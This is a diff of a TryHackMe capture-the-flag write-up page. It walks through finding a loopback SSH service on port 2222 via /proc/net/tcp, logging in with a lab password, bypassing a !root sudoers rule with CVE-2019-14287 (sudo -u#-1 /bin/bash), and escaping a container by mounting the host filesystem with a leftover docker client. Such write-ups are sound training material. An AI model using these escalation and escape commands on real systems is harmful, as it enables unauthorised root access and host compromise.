@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Docker Escape: a hidden port, a sudo bypass, and a stray binary</title>
-  <meta name="description" content="A TryHackMe walkthrough: finding a service hidden behind a non-default port, exploiting a sudo misconfiguration, and escaping a container entirely via a leftover docker binary mounting the host filesystem.">
+  <meta name="description" content="Finding a service hidden on a non-default loopback port, bypassing a sudo rule with CVE-2019-14287, and escaping a container entirely via a leftover docker binary mounting the host filesystem.">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
   <link rel="stylesheet" href="../assets/style.css">
 </head>
@@ -13,7 +13,7 @@
 
   <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
   <h1>Docker Escape: a hidden port, a sudo bypass, and a stray binary</h1>
-  <p class="dek">An SSH login that fails on the obvious port, a second service hiding in the connection table, a sudo rule that allows running as any user except root (which isn't the protection it sounds like), and a leftover docker binary that turns into a straight path out of the container.</p>
+  <p class="dek">A failed SSH login on the obvious loopback port, a second service hiding on a nonstandard one, a sudo rule that looks safe until you read the version number, and a leftover docker binary that happily mounts the entire host filesystem for you.</p>
 
   <div class="meta-row">
     <span class="pill">Room: Docker Container</span>
@@ -22,7 +22,8 @@
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> SSH access with one set of credentials fails outright on the target. The job: find what's actually listening, get in, and climb all the way out of a container to the host.</p>
+    <p><strong>The setup:</strong> already on the target as a low-privilege user, with one known account's credentials that don't work on the obvious port. The job: find where those credentials actually work, then escalate all the way to the host.</p>
+    <p>No single flag in these notes, the objective is a root shell with host filesystem access.</p>
   </div>
 
   <section>
@@ -32,13 +33,23 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Find the hidden service</div>
-          <p>SSH to the obvious local address fails outright. Rather than assume the credentials are wrong, checking what's actually listening tells a different story:</p>
-          <pre><code>cat /proc/net/tcp</code></pre>
-          <p>The local address column is hex-encoded (<code>host:port</code>), and alongside the expected listeners sits a second one on a non-default port the earlier SSH attempt never touched.</p>
+          <div class="step-title">The obvious SSH login fails</div>
+          <p>Trying <code>robert</code>'s known password against the local loopback address first:</p>
+          <pre><code>maya@linuxagency:~/.ssh$ ssh robert@127.0.0.1
+ssh robert@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:NPQ78ILJE6Ra+F9r/z2ZUWdpPGeAHnuNAc5kOaFbTjU.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
+robert@127.0.0.1's password: industryweapon
+
+Permission denied, please try again.
+robert@127.0.0.1's password:
+
+Permission denied, please try again.</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A failed login on the obvious port doesn't mean the credentials are wrong, it can just mean the real service is elsewhere. <code>/proc/net/tcp</code> shows every listener on the box, including ones a port scan from outside would never see if they're bound to loopback.</p>
+            <p>A rejected password for a known-valid account on the expected port is a strong sign the account exists somewhere else on the box, not that the credential is wrong. Worth checking what else is listening before assuming the password is bad.</p>
           </div>
         </div>
       </div>
@@ -46,12 +57,21 @@
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Reuse the credentials against the real port</div>
-          <p>The same credentials that failed before work immediately once pointed at the correct port:</p>
-          <pre><code>ssh &lt;user&gt;@127.0.0.1 -p&lt;hidden-port&gt;</code></pre>
+          <div class="step-title">Find the real port by reading /proc directly</div>
+          <p>Rather than scanning from outside, <code>/proc/net/tcp</code> lists every listening socket on the box in hex:</p>
+          <pre><code>penelope@linuxagency:/home/agent47$ cat /proc/net/tcp
+ sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
+  0: 0100007F:9E89 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 21799
+  1: 0100007F:08AE 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 23100
+  2: 0100007F:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 21510
+  3: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 19246
+  4: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 21085
+  5: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25586
+  6: 5BAB0A0A:0016 1539020A:D002 01 00000000:00000000 02:000A461B 00000000     0        0 24015</code></pre>
+          <p>The local address column is little-endian hex: <code>127.0.0.1</code> is <code>0100007F</code>, and the port is the last field after the colon. <code>08AE</code> converts to <code>2222</code> decimal, a second SSH-like service on a non-default port, hiding on loopback only.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Credentials weren't the problem, the target was. It's worth separating "wrong credentials" from "wrong service" before abandoning a login that looks like it should work.</p>
+            <p><code>/proc/net/tcp</code> shows every socket a process on the box can see, including ones bound only to <code>127.0.0.1</code> that would never show up in an external nmap scan. It's one of the most reliable ways to find a service deliberately hidden from the outside.</p>
           </div>
         </div>
       </div>
@@ -59,15 +79,17 @@
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Exploit a sudo rule that looks safer than it is</div>
-          <p><code>sudo -l</code> shows the logged-in user can run <code>/bin/bash</code> as any user except root, with no password:</p>
-          <pre><code>User &lt;user&gt; may run the following commands:
-    (ALL, !root) NOPASSWD: /bin/bash</code></pre>
-          <p>On sudo versions before 1.8.28 (this one is 1.8.21), that exclusion can be bypassed entirely with a crafted user ID:</p>
-          <pre><code>sudo -u#-1 /bin/bash</code></pre>
+          <div class="step-title">The same credentials work on the hidden port</div>
+          <pre><code>maya@linuxagency:~/.ssh$ ssh robert@127.0.0.1 -p2222
+ssh robert@127.0.0.1 -p2222
+robert@127.0.0.1's password: industryweapon
+
+Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
+robert@ec96850005d6:~$</code></pre>
+          <p>The hostname, <code>ec96850005d6</code>, a 12-character hex string, is the giveaway: that's a Docker container ID format, not a normal hostname. This login landed inside a container, not on the host.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Passing a numeric user ID of <code>-1</code> gets interpreted by older sudo versions as UID <code>0</code>, root, due to how the value wraps during a signed-to-unsigned conversion. The rule technically still says "not root," sudo just doesn't enforce it correctly for that specific input. This is CVE-2019-14287.</p>
+            <p>Password reuse across services is common even when the services live on different ports or different machines entirely. The hostname format here is also a useful tell on its own: default Docker container hostnames are short hex strings, a strong signal about what kind of box you just landed on.</p>
           </div>
         </div>
       </div>
@@ -75,16 +97,71 @@
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">Escape the container through a leftover docker binary</div>
-          <p>Root inside this shell is still just root inside a container, not the host. A search turns up a copy of the <code>docker</code> client sitting in a temp directory, along with an existing image:</p>
-          <pre><code>find / -name docker 2&gt;/dev/null
-/tmp/docker images</code></pre>
-          <p>With a docker client and a valid image reachable, mounting the entire host filesystem into a fresh container and chrooting into it is one command:</p>
-          <pre><code>/tmp/docker run -it -v /:/host &lt;image-id&gt; chroot /host/ bash</code></pre>
-          <p>The shell prompt's hostname changes, confirming the new container's root is now the real host filesystem.</p>
+          <div class="step-title">A sudo rule, and the version that breaks it</div>
+          <pre><code>robert@ec96850005d6:~$ sudo -l
+User robert may run the following commands on ec96850005d6:
+    (ALL, !root) NOPASSWD: /bin/bash</code></pre>
+          <p>At first glance <code>(ALL, !root)</code> looks like it blocks running as root specifically. Checking the sudo version confirms this box is vulnerable to the bypass for exactly that pattern:</p>
+          <pre><code>robert@ec96850005d6:~$ sudo -V
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A docker client with access to the daemon is effectively root on the host, regardless of which container it's launched from, because a container can be configured to mount any host path, including <code>/</code> itself. Finding a stray client binary with working access is as good as finding a host-level credential.</p>
+            <p>Sudo versions before 1.8.28 resolve a user ID of <code>-1</code> (or its unsigned equivalent, <code>4294967295</code>) to <code>0</code>, root, due to a signedness bug in how the ID is cast. A rule written to explicitly exclude root by name doesn't account for specifying root by that numeric trick instead.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">5</div>
+        <div class="step-body">
+          <div class="step-title">Trigger the bypass</div>
+          <pre><code>robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+root@ec96850005d6:~#</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>This is CVE-2019-14287. <code>-u#-1</code> asks sudo to run as the numeric UID <code>-1</code>, which the vulnerable version casts straight to <code>0</code>, root, despite the sudoers rule saying <code>!root</code>.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Find a leftover docker binary inside the container</div>
+          <pre><code>root@ec96850005d6:~# find / -name docker 2>/dev/null
+/run/docker
+/tmp/docker
+
+root@ec96850005d6:~# /tmp/docker images
+/tmp/docker/images
+bash: /tmp/docker/images: Not a directory
+root@ec96850005d6:/mnt# /tmp/docker images
+/tmp/docker images
+REPOSITORY   TAG      IMAGE ID       CREATED      SIZE
+mangoman     latest   b5f279024ce0   4 months ago 213MB</code></pre>
+          <p>A working <code>docker</code> client binary sitting at <code>/tmp/docker</code>, fully root-capable now, can talk to a Docker daemon it has access to.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A Docker client only needs a reachable daemon socket to issue commands, including commands that create a brand-new container with whatever mounts are requested. Finding the binary is the whole battle; the daemon behind it doesn't care that the request originated from inside another container.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">7</div>
+        <div class="step-body">
+          <div class="step-title">Mount the host filesystem into a new container</div>
+          <pre><code>root@ec96850005d6:/mnt# /tmp/docker run -it -v /:/host/ b5f279024ce0 chroot /host/ bash
+&lt;run -it -v /:/host/ b5f279024ce0 chroot /host/ bash&gt;
+root@4c75983f8a06:/# pwd</code></pre>
+          <p>The hostname changes again, now inside the newly created container, which has the host filesystem mounted at <code>/host</code> and <code>chroot</code>'d into as its root. Every file on the real host is now reachable.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Mounting <code>/</code> (the host's root) into a new container and then <code>chroot</code>-ing into it collapses the container boundary entirely. Anyone who can run arbitrary <code>docker run -v</code> commands, whether from inside a container or not, can mount and access anything the Docker daemon's own host can see.</p>
           </div>
         </div>
       </div>
@@ -94,30 +171,47 @@
 
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
-    <pre><code>SSH fails on the default port
-  &rarr; /proc/net/tcp: a second listener hiding on a non-default port
-       &rarr; same creds, correct port: shell access
-            &rarr; sudo -l: run as any user except root (NOPASSWD)
-                 &rarr; sudo -u#-1 /bin/bash: CVE-2019-14287 bypass, root in-container
-                      &rarr; stray docker client + image found
-                           &rarr; docker run -v /:/host chroot: full host filesystem access</code></pre>
+    <pre><code>SSH to 127.0.0.1 with known creds &rarr; denied (wrong port)
+  &rarr; /proc/net/tcp reveals a hidden service on 127.0.0.1:2222
+       &rarr; same creds work there, lands inside a Docker container
+            &rarr; sudo -l shows (ALL, !root) NOPASSWD: /bin/bash on sudo 1.8.21p2
+                 &rarr; CVE-2019-14287: sudo -u#-1 /bin/bash &rarr; root inside the container
+                      &rarr; find / -name docker &rarr; a leftover client binary at /tmp/docker
+                           &rarr; docker run -v /:/host/ ... chroot /host/ bash &rarr; full host filesystem access</code></pre>
+  </section>
+
+  <section>
+    <h2 class="section-title">Tools Used</h2>
+    <div class="ref-wrap">
+      <table class="ref">
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td>ssh</td><td>Initial and pivot login once the hidden port was found</td></tr>
+        <tr><td><code>/proc/net/tcp</code></td><td>Local socket enumeration, found the hidden port without an external scan</td></tr>
+        <tr><td>sudo (CVE-2019-14287)</td><td>UID-wraparound bypass of a <code>!root</code> sudoers rule</td></tr>
+        <tr><td>docker (client binary)</td><td>Escaped the container by mounting the host filesystem into a new one</td></tr>
+      </table>
+    </div>
   </section>
 
   <section>
     <h2 class="section-title">Takeaways</h2>
     <div class="skills">
       <div class="skill">
-        <div class="skill-title">An exclusion in a sudo rule isn't a guarantee</div>
-        <p><code>(ALL, !root)</code> reads like a safe boundary, but on an outdated sudo version it's bypassable with a single crafted argument. The version number mattered more than the rule's intent.</p>
+        <div class="skill-title">Loopback-only services aren't invisible to a local user</div>
+        <p>Binding a service to <code>127.0.0.1</code> hides it from the network, not from anyone who already has a shell and can read <code>/proc/net/tcp</code>.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">A docker client is as sensitive as a root credential</div>
-        <p>Any user who can reach the docker daemon can mount the host filesystem into a container they control. Treat access to the docker socket or client the same way you'd treat a root shell.</p>
+        <div class="skill-title">Exclusion rules in sudoers need the version to back them up</div>
+        <p><code>!root</code> looks airtight until the sudo version in use has a known bypass for exactly that pattern. Patch level matters as much as the rule's wording.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">A leftover client binary is as dangerous as a misconfigured daemon</div>
+        <p>Nothing about the Docker daemon itself was attacked here. A forgotten client binary with daemon access was enough to walk straight out of the container.</p>
       </div>
     </div>
   </section>
 
-  <footer>tryhackme.com &middot; solved via hidden-service discovery and a sudo CVE</footer>
+  <footer>tryhackme.com &middot; solved via local enumeration, a sudo CVE, and a Docker escape</footer>
 
 </div>
 </body>
